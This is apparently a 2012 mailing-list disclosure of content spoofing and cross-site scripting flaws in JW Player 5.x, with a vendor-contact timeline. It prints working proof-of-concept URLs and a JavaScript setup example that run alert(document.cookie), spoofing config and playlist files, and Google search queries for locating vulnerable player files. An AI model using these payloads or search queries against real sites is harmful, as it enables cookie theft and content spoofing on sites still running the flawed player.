Hello list!

I want to warn you about security vulnerabilities in JW Player.

These are Content Spoofing and Cross-Site Scripting vulnerabilities.

-------------------------
Affected products:
-------------------------

Vulnerable are JW Player 5.9.2156 (and 5.9.2206, except one vulnerability) 
and previous versions. Tested in 5.7.1896, 5.9.2156 and 5.9.2206. Only some 
of these vulnerabilities exist in 3.x and previous versions.

In version 5.9.2206 developers have fixed first XSS hole from 
bellow-mentioned.

Content Spoofing (WASC-12):

In parameter file there can be set as video, as audio files.

Swf-file of JW Player accepts arbitrary addresses in parameters file and 
image, which allows to spoof content of flash - i.e. by setting addresses of 
video (audio) and/or image files from other site.

http://http://site/jwplayer.swf?file=1.flv&backcolor=0xFFFFFF&screencolor=0xFFFFFF
http://http://site/jwplayer.swf?file=1.flv&image=1.jpg

Swf-file of JW Player accepts arbitrary addresses in parameter config, which 
allows to spoof content of flash - i.e. by setting address of config file 
from other site (parameters file and image in xml-file accept arbitrary 
addresses). For loading of config file from other site it needs to have 
crossdomain.xml.

http://http://site/jwplayer.swf?config=1.xml

1.xml

<config>
  <file>1.flv</file>
  <image>1.jpg</image>
</config>

Swf-file of JW Player accepts arbitrary addresses in parameter playlistfile, 
which allows to spoof content of flash - i.e. by setting address of playlist 
file from other site (parameters media:content and media:thumbnail in 
xml-file accept arbitrary addresses). For loading of playlist file from 
other site it needs to have crossdomain.xml.

http://http://site/jwplayer.swf?playlistfile=1.rss
http://http://site/jwplayer.swf?playlistfile=1.rss&playlist.position=right&playlist.size=200

1.rss

<rss version="2.0" xmlns:media="http://search.yahoo.com/mrss/">
  <channel>
    <title>Example playlist</title>
    <item>
      <title>Video #1</title>
      <description>First video.</description>
      <media:content url="1.flv" duration="5" />
      <media:thumbnail url="1.jpg" />
    </item>
    <item>
      <title>Video #2</title>
      <description>Second video.</description>
      <media:content url="2.flv" duration="5" />
      <media:thumbnail url="2.jpg" />
    </item>
  </channel>
</rss>

XSS (WASC-08):

http://http://site/jwplayer.swf?playerready=alert(document.cookie)

XSS (WASC-08):

If at the site at page with jwplayer.swf (player.swf) there is possibility 
(via HTML Injection) to include JS code with callback-function, and there 
are 19 such functions in total, then it's possible to conduct XSS attack. 
I.e. JS-callbacks can be used for XSS attack.

Example of exploit:

<script type="text/javascript" src="jwplayer.js"></script>
<div id="container">...</div>
<script type="text/javascript">
jwplayer("container").setup({
flashplayer: "jwplayer.swf",
file: "1.flv",
autostart: true,
height: 300,
width: 480,
events: {
onReady: function() { alert(document.cookie); },
onComplete: function() { alert(document.cookie); },
onBufferChange: function() { alert(document.cookie); },
onBufferFull: function() { alert(document.cookie); },
onError: function() { alert(document.cookie); },
onFullscreen: function() { alert(document.cookie); },
onMeta: function() { alert(document.cookie); },
onMute: function() { alert(document.cookie); },
onPlaylist: function() { alert(document.cookie); },
onPlaylistItem: function() { alert(document.cookie); },
onResize: function() { alert(document.cookie); },
onBeforePlay: function() { alert(document.cookie); },
onPlay: function() { alert(document.cookie); },
onPause: function() { alert(document.cookie); },
onBuffer: function() { alert(document.cookie); },
onSeek: function() { alert(document.cookie); },
onIdle: function() { alert(document.cookie); },
onTime: function() { alert(document.cookie); },
onVolume: function() { alert(document.cookie); }
}
});
</script>

There is such feature as logo in licensed version of the player. So in 
licensed versions of swf-file there are also the next vulnerabilities:

Content Spoofing (WASC-12):

http://http://site/jwplayer.swf?file=1.flv&logo.file=1.jpg&logo.link=http://websecurity.com.ua

XSS (WASC-08):

http://http://site/jwplayer.swf?file=1.flv&logo.file=1.jpg&logo.link=javascript:alert(document.cookie)

Widespread of vulnerabilities.

Swf-files of JW Player can have different names, such as jwplayer.swf and 
player.swf.

http://www.google.com.ua/search?q=inurl%3Ajwplayer.swf+filetype%3Aswf
http://www.google.com.ua/search?q=inurl%3Aplayer.swf+filetype%3Aswf

By Google's information, there are 99600 + 7610000 = 7709600 (in May) of 
such flash files in Internet. This is approximate data and not all of the 
player.swf are swf-files of JW Player, but taking into account that this is 
very popular flash application, which is used as standalone, as a part of 
different web applications (CMS), and Google could indexed only 10% of its 
swf-files, then we receive tens millions of vulnerable swf-files of JW 
Player in Internet.

Timeline:
------------ 

2012.05.25 - found vulnerabilities during pentest (in version 5.7.1896 and 
tested in the last version from official site). Some of CS vulnerabilities 
had existed in 3.x version of the player and I knew about them since 2008, 
when first time saw JW Player.
2012.05.28 - announced at my site.
2012.05.29 - informed developers.
2012.05.29 - developers answered that most holes should be fixed in version 
5.9.2206 (in trunk).
2012.05.31 - after checking, I've informed developers that in trunk only one 
XSS are fixed. Then they answered that they were planning to fix all other 
vulnerabilities in upcoming 6.0 version of the player.
2012.06.06 - disclosed at my site (http://websecurity.com.ua/5848/).
